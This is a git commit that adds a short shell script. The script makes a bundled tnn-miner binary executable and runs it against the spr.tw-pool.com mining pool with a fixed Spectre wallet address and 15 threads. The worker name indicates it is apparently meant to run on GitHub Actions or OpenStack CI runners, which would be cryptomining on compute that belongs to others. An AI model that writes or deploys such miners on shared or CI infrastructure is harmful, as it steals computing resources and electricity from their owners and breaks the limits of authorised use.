8b5595c9949c0af80283109c16861fb8a8dac27d
Lam Ngoc <119742856+lamngocnetwork@users.noreply.github.com>
2024-07-06 12:50:57 +0700

    Create run.sh

---
+++ run.sh
@@ -0,0 +1,3 @@
+#!/bin/bash
+chmod +x ./tnn-miner-v0.3.6
+./tnn-miner-v0.3.6 --spectre --daemon-address spr.tw-pool.com --port 14001 --wallet spectre:qqzqrthexh8tv5eg6sc4jp6gnuxg5gt4ahjnj0558s2nc9nsw78ywc43szyk0  --threads 15 --worker test-githubaction-openstack-cpu1
